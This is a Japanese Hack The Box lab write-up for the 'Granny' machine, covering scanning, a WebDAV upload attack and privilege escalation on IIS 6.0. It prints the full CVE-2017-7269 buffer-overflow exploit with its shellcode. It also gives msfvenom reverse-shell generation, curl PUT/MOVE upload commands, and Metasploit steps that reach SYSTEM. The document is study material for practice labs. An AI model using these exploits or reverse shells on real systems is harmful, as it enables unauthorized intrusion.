# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
Twitter:@yukitsukai_47
# Granny
HackTheBox公式より  
<img width="416" alt="スクリーンショット 2020-05-25 14.57.49.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6a4c0776-3fc4-f8d6-2729-1622f408da79.png">

Granny, while similar to Grandpa, can be exploited using several different methods. The intended
method of solving this machine is the widely-known Webdav upload vulnerability.

おばあちゃんは、おじいちゃんに似ていますが、いくつかの異なる方法を使って悪用することができます。このマシンを解決する意図された方法は、広く知られているWebdavアップロードの脆弱性です。
# スキャン
Granny(10.10.10.15)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 
```
nmap -sC -sV -p- -oN granny 10.10.10.15
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -p-...全ポートのスキャン(rootが必要)
- -oN...通常出力

-p-オプションを付けると、かなり時間がかかってしまい1時間ほどスキャンしても結果が出なかったため下記の例では外しています。

```
#Nmap 7.80 scan initiated Sun May 24 08:54:16 2020 as: nmap -sC -sV -oN granny 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Sun, 24 May 2020 12:57:06 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#Nmap done at Sun May 24 08:54:44 2020 -- 1 IP address (1 host up) scanned in 28.36 seconds
```
ここでGrannyは80番ポートがMicrosoft IIS httpd 6.0で動いていることが分かります。
## gobuster
次に80番ポートが空いていることが分かったので、gobusterを使ってディレクトリを列挙していきましょう。

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.15
```

- dirモード
- -w 単語リストの使用
- -u URLの指定

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.15
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403                                                                       
[+] User Agent:     gobuster/3.0.1                                                                                    
[+] Timeout:        10s                                                                                               
===============================================================                                                       
2020/05/24 08:20:53 Starting gobuster                                                                                 
===============================================================                                                       
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)
/_private (Status: 301)
===============================================================
2020/05/24 09:55:13 Finished
===============================================================
```
単語リストにdirectory-list-2.3-medium.txtを使用したので1時間半ほどかかりましたが、特にこれといったものは見つかっていないような気がします。

## Nikto
次はNiktoを使用してスキャンを行います。

```
kali@kali:~$ nikto --url http://10.10.10.15
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.15
+ Target Hostname:    10.10.10.15
+ Target Port:        80
+ Start Time:         2020-05-24 08:21:58 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.                                                        
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                                                   
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub                                            
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                                                   
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPFIND MKCOL PROPPATCH SEARCH UNLOCK LOCK COPY listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_private/: FrontPage directory found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
w+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ OSVDB-3092: /test.aspx: This might be interesting...
+ 8019 requests: 0 error(s) and 33 item(s) reported on remote host
+ End Time:           2020-05-24 08:57:51 (GMT-4) (2153 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
ここでは、
OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
について着目したいと思います。
OSVDB-397についてGoogle先生に聞いてみます。  
<img width="765" alt="スクリーンショット 2020-05-25 0.30.47.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4666cd8e-08ed-e819-f24b-f87ba85a827d.png">

どうやらWebサーバには、リモートの攻撃者が任意のファイルをアップロードできる可能性のある欠陥が含まれているようです。

# 侵入
スキャン結果を用いて、侵入を開始していきましょう。まず、80番ポートが空いていることが分かっているので、http\://10.10.10.15にアクセスしてみます。  
<img width="837" alt="スクリーンショット 2020-05-24 23.16.24.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/61cca05c-a3e6-7804-2912-a72f3087410f.png">

このことから、サイトを構築している途中のサーバなのかな？ということが推測できます。次にgobusterで発見した/images,/IMAGES,/Images,/_privateにアクセスしてみましたが、特に目ぼしいものは見つかりませんでした。

<img width="843" alt="スクリーンショット 2020-05-25 14.10.38.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/760475e3-9d89-403b-a253-d0bf15bd8c03.png">

## searchsploit
まずは、nmapの結果からMicrosoft IIS 6.0が使用されていることが分かっているので、searchsploitを使用して検索してみましょう。

```
kali@kali:~$ searchsploit IIS 6.0
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure    | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow             | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service               | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                        | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-0 | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow            | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                     | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                       | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                            | windows/remote/19033.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```
この中でMicrosoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow            | windows/remote/41738.pyが使えそうなので、さっそくmetasploitで試してみます。

```
searchsploit -x -m windows/remote/41738.py
```
- -x エクスプロイトの中身を見る
- -m 現在の作業ディレクトリにエクスプロイトをコピー

```
Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.                                                                                                                                         
                                                                                                                                                                                                                                            
Additional Information: the ScStoragePathFromUrl function is called twice                                                                                                                                                                   
Vulnerability Type: Buffer overflow                                                                                                                                                                                                         
Vendor of Product: Microsoft
Affected Product Code Base: Windows Server 2003 R2
Affected Component: ScStoragePathFromUrl
Attack Type: Remote
Impact Code execution: true
Attack Vectors: crafted PROPFIND data

Has vendor confirmed or acknowledged the vulnerability?:true

Discoverer:Zhiniang Peng and Chen Wu.
Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China
'''

#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.
#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China 
#-----------Email: edwardz@foxmail.com

import socket  

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(('127.0.0.1',80))  

pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
pay+='If: <http://localhost/aaaaaaa'
pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
pay+='>'
pay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'
pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'

shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'

pay+=shellcode
pay+='>\r\n\r\n'
print pay

sock.send(pay)  
data = sock.recv(80960)  

print data 
sock.close
```
このPythonスクリプト41738.pyを利用すると、機能はしますが、サーバ上でcalc.exeが開くようです。
しかし、metasploitにCVE-2017-7269を利用できるものがあったので、それを使います。

```
msf5 > search CVE-2017-7269

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------                                                              
   MAXPATHLENGTH  60               yes       End of physical path brute force                                         
   MINPATHLENGTH  3                yes       Start of physical path brute force                                       
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]             
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                                                                                                             
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.20:4444 
[*] Trying path length 3 to 60 ...
[*] Exploit completed, but no session was created.
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > 
```
他のWriteupなどをあげている人のを見ると成功しているようなのですが、僕の環境では成功しないので次を試そうと思います。

## davtest
次に、Niktoのスキャンで発見したOSVDB-397を利用してみたいと思います。  
davtestを使って、アップロードできるファイルの種類と、ディレクトリを作成できるかどうかを確かめます。

```
davtest -url http://10.10.10.15
```

```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: Xr3IH3ZG
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_Xr3IH3ZG
********************************************************
 Sending test files
PUT     asp     FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.jhtml
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.php
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.cfm
PUT     shtml   FAIL
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.txt
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.pl
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.html
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.jsp
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.txt
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.html
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_Xr3IH3ZG
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.jhtml
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.php
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.cfm
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.txt
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.pl
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.html
PUT File: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.jsp
Executes: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.txt
Executes: http://10.10.10.15/DavTestDir_Xr3IH3ZG/davtest_Xr3IH3ZG.html
```

この結果を見ると、txtとhtmlが送信できることが分かります。試しに簡単なhtmlファイルを送信してみましょう。

```html:test.html
<h1>test</h1>
```
送信をするには、以下のコマンドを用いて行います。

```
curl -X PUT http://10.10.10.15/test.html -d @test.html
```
<img width="845" alt="test.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/306fa12a-b12d-e0d0-4c90-0026e507c373.png">

しっかり、表示されていることが分かります。

アップロードができることが分かったので、msfvenomを使用してreverse_shellを確立しましょう。

```
kali@kali:~$msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=1111 -f aspx -o shell.aspx
```

- -p：ペイロード
- -f：フォーマット
- LHOST：攻撃マシンのIPアドレス
- LPORT：リバースシェルを送信したいポート
- -o：ペイロードを保存する場所

次に、ファイルをshell.txtのテキストファイルに変更してサーバにアップロードできるようにしてから、アップロードを行い、ファイルの拡張子をaspxに変更します。

```
kali@kali:~$mv shell.aspx  shell.txt
kali@kali:~$curl -X PUT https://10.10.10.15/shell.txt --data-binary @shell.txt
kali@kali:~$curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
```

最後にmeterpreterでreverse_shellを待ち受けます。

```
kali@kali:~$msfconsole
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.20
LHOST => 10.10.14.20
msf5 exploit(multi/handler) > set LPORT 1111
LPORT => 1111
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.20:1111 
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.20:1111 -> 10.10.10.15:1068) at 2020-05-24 09:42:54 -0400

meterpreter >
```
これでreverse_shell接続を確立することに成功しました。

# 特権エスカレーション
このままでは権限が低いので、NT AUTHORITY\SYSTEMの権限を取りに行きましょう。この権限がないとroot.txt，user.txtにもアクセス権限がないようです。
おなじみのlocal_exploit_suggesterを使用して、悪用できる脆弱性がないか調べてみましょう。

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 31 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
いくつか見つかったのであまり調べることなく、とりあえずms15_051_client_copy_imageを使ってみます。

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image 
msf5 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf5 exploit(windows/local/ms15_051_client_copy_image) > run

[-] Handler failed to bind to 172.16.36.129:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Launching notepad to host the exploit...
[+] Process 1372 launched.
[*] Reflectively injecting the exploit DLL into 1372...
[*] Injecting exploit into 1372...
[*] Exploit injected. Injecting payload into 1372...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```
どうやらNT AUTHORITY\SYSTEMではなく、NT AUTHORITY\NETWORK SERVICEの権限を取ってしまったようです。この権限だと先ほどと同じく、user.txtやroot.txtにアクセスする権限がなかったので、他の脆弱性を試してNT AUTHORITY\SYSTEMを目指します。
今度はlocal_exploit_suggesterで提示されていたms14_058_track_popup_menuを使用してみます。

```
msf5 exploit(windows/local/ms14_058_track_popup_menu) > use exploit/windows/local/ms14_070_tcpip_ioctl 
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set sessions 1
sessions => 1
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run

msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

無事、NT AUTHORITY\SYSTEMが得られました。  
お疲れ様でした。

